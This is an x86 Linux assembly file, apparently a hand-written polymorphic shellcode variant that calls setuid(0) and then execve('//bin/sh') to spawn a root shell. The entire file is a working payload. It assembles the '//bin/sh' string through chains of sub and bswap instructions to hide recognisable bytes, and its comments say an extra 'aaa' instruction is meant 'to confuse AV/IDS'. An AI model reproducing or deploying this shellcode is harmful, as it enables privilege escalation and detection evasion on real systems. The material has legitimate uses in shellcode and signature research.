global _start

section .text

_start:

   sub ebx,ebx				; different alternative instructions 
   and eax,ebx 				; to clear up eax and ebx
   jmp short do_something
 
back: 
   add al,0x17				; eax is zero, so adding 0x17 is like moving directly
   int 0x80				; setuid(0)

   push ebx
   ;------------------------------------
   ;	Here goes the new stuff
   ;    IT WORKS! but it's too
   ;    expensive in terms of space
   ;    (each sub instruction is 6 bytes)
   ;------------------------------------
   sub ebx,0x577a7066              	; This gives a final value of 0x6e2f7368 in eax (6 bytes each)
   sub ebx,0x577a7066              	; Just what we need but in reverse order :(
   sub ebx,0xe2dbabcc
   bswap ebx                       	; This changes the byte order in the registry (2 bytes)
   push ebx				; The final value in ebx is 0x68732f6e

   xor ebx,ebx
   sub ebx,0x7e7e5b5b              	; This works. Not sure why, but it does.
   sub ebx,0x7e7e5b5b              	; Yields 0x69622f2f in ecx
   sub ebx,0x99a11a1b
   push ebx
   ;-------------------------------------
   

   sub eax,eax				; another way to clear eax.
   mov ebx,esp				; keep this instruction equal 
   
   push eax
   mov edx,esp			        ; push a null using ecx instead of eax.		
   
   push ebx				; 
   mov ecx, esp				; CHANGED
   
   or al,0xb                            ; another way to move 0xb to al, since it is alerady zero
   int 0x80                             ; execve("//bin/sh",null,null)
 

do_something:
   aaa					; Nothing useful, just to confuse AV/IDS. Why not? :)
   jmp short back	
  
